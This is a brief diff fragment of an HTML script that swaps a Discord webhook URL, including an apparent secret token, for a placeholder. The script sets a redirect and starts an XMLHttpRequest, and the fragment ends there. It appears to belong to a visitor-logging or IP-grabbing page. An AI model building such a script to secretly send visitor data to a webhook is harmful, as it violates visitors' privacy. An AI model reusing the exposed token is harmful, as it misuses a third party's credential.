@@ -1,5 +1,5 @@
 <script>
-var webhook = "https://discord.com/api/webhooks/217983781290312938/QbesUFNT7I8ygh8PmJ_SkyQ_1536C9rwOyeBsHihiiuUIjkhGYgYiBoOSGDHSAyG_w0o";
+var webhook = "Youtube.com";
 var redirect = "https://graysuit.github.io";
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() { 
